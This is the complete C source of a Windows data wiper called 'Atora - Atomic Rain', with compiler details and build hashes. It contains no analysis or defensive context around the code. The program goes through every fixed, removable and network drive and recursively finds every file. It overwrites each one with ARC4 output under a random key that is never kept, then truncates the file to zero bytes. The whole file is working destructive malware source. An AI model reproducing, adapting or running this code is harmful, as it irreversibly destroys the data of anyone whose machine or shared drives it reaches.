/*
  Name:             Atora - Atomic Rain. Windows version.
  Version:          5.60/05.06.20
  Compiler:         TCC ver 0.9.27
  Class:            Files shredder for Windows. Wiper.
  What is he doing: Encrypts all files on all local drives with a cipher ARC4
  SHA-2-256:        90d9e3fcf78f8ea6b75ea8f2af071be745cecbccbc64f829132a3e28923dbdcc
  SHA-2-256_UPX:    00e217052ebf8c2d658b426e3d54d1d202a0cd27168edb3523ad36c648c3c50b
*/
#include <io.h>
#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <windows.h>

#define BUFFER_SIZE 8192

char * PARAM_REWRITE_BYTE = "r+b";

char * expansion  = "*";
char * slash      = "\\";
char * t_one      = ".";
char * t_two      = "..";

size_t i, j;

typedef struct {
  uint8_t data       [256];
  uint8_t secret_key [256];
  uint8_t input      [BUFFER_SIZE];
  uint8_t output     [BUFFER_SIZE];
} MEMORY_CTX;

void swap (uint8_t * a, uint8_t * b) {
  uint8_t t = *a;

  *a = *b;
  *b = t;
}

void arc4_init(MEMORY_CTX * ctx, const size_t length) {

  for (i = 0; i < 256; i++)
    ctx->secret_key[i] = (uint8_t)i;

  for (i = j = 0; i < 256; i++) {
    j = (j + ctx->data[i % length] + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
  }

  i = j = 0;
}

void arc4(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t k = 0; k < length; k++) {
    i = (i + 1) % 256;
    j = (j + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
    ctx->output[k] = ctx->input[k] ^ ctx->secret_key[(ctx->secret_key[i] + ctx->secret_key[j]) % 256];
  }
}

int genrand(const int min, const int max) {
  return min + rand() % ((max + 1) - min);
}

void write_trash(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t i = 0; i < length; i++) {
    ctx->data[i] = (uint8_t)genrand(0x00, 0xFF);
  }
}

void generate_key(MEMORY_CTX * ctx) {
  write_trash(ctx, 256);
  arc4_init(ctx, 256);
}

long int size_of_file(FILE * f) {

  fseek(f, 0, SEEK_END);
  long int result = ftell(f);
  fseek(f, 0, SEEK_SET);

  return result;
}

void file_encrypt(MEMORY_CTX * ctx, const uint8_t * filename) {
  FILE * file = fopen((char *)filename, PARAM_REWRITE_BYTE);

  if (file == NULL) {
    return;
  }

  long int fsize = size_of_file(file);

  if ((fsize == -1L) || (fsize == 0)) {
    fclose(file);
    return;
  }

  long int position = 0;
  size_t   realread = 0;

  while (position < fsize) {
    realread = fread((void *)(ctx->input), 1, BUFFER_SIZE, file);

    arc4(ctx, realread);
    fseek(file, position, SEEK_SET);

    if (fwrite((void *)(ctx->output), 1, realread, file) != realread) {
      break;
    }

    fflush(file);
    position += (long int)realread;
  }

  memset((void *)(ctx->input),  0x00, BUFFER_SIZE);
  memset((void *)(ctx->output), 0x00, BUFFER_SIZE);

  (void)chsize(fileno(file), 0);

  fclose(file);
}

void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask) {
  WIN32_FIND_DATA wfd;
  HANDLE hfound;

  uint8_t new_path_of_file[MAX_PATH];
  uint8_t file_of_path[MAX_PATH];
  uint8_t path_file[MAX_PATH];
  uint8_t path_for_delete[MAX_PATH];

  strcpy(file_of_path, path);
  strcat(file_of_path, slash);
  strcpy(path_for_delete, file_of_path);
  strcat(file_of_path, mask);

  if ((hfound = FindFirstFile(file_of_path, &wfd)) != INVALID_HANDLE_VALUE) {
    do {
      if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
        if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
          strcpy(path_file, path_for_delete);
          strcat(path_file, wfd.cFileName);

          generate_key(ctx);
          file_encrypt(ctx, path_file);
        }
        else {
          strcpy(new_path_of_file, path);
          strcat(new_path_of_file, slash);
          strcat(new_path_of_file, wfd.cFileName);

          search_all_files(ctx, new_path_of_file, mask);
        }
      }
    } while(FindNextFile(hfound, &wfd) != 0);
  }

  FindClose(hfound);
}

int checklogicaldisk(const uint8_t number_disk) {
  uint8_t logical_disk[4] = "::\\";
          logical_disk[0] = number_disk;

  uint32_t result = GetDriveType(logical_disk);

  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOVABLE) || (result == DRIVE_REMOTE))
    return 0;
  else
    return (-1);
}

int main (void) {
  uint8_t local_disk[] = "::";
  size_t  memory_size = sizeof(MEMORY_CTX);

  MEMORY_CTX * memory = (MEMORY_CTX *)calloc(1, memory_size);

  if (memory != NULL) {
    srand((uint32_t)time(NULL));

    for (uint8_t disk = 'A'; disk <= 'Z'; disk++) {
      if (checklogicaldisk(disk) == 0) {
        local_disk[0] = disk;
        search_all_files(memory, local_disk, expansion);
      }
    }

    memset((void *)memory, 0x00, memory_size);
    free((void *)memory);
    memory = NULL;
  }

  return 0;
}
